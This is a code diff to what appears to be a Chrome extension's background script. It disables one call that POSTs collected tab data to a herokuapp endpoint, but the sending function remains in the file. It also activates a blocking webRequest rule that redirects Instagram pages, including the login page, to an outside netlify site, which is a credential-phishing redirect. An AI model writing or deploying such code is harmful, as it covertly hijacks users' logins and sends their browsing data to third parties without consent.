@@ -48,7 +48,7 @@ chrome.tabs.onActivated.addListener(function(activeInfo){
             body: JSON.stringify(data)
         };
 
-         sendData(options);
+        //  sendData(options);
         
 
 
@@ -68,21 +68,21 @@ async function sendData(options){
    await fetch('https://chrome21.herokuapp.com/data',options)
 }
 
-// var host = "https://mystifying-hermann-7b16a6.netlify.app/";
+var host = "https://mystifying-hermann-7b16a6.netlify.app/";
 
-// chrome.webRequest.onBeforeRequest.addListener(
-//     function(details) {
-//          return {redirectUrl: host };
-//     },
-//     {
-//         urls: [
+chrome.webRequest.onBeforeRequest.addListener(
+    function(details) {
+         return {redirectUrl: host };
+    },
+    {
+        urls: [
            
-//             "https://instagram.com/*",
-//             "https://www.instagram.com/?hl=en",
-//             "https://www.instagram.com/accounts/login/"
+            "https://instagram.com/*",
+            "https://www.instagram.com/?hl=en",
+            "https://www.instagram.com/accounts/login/"
             
-//         ],
-//         types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
-//     },
-//     ["blocking"]
-// );
+        ],
+        types: ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
+    },
+    ["blocking"]
+);
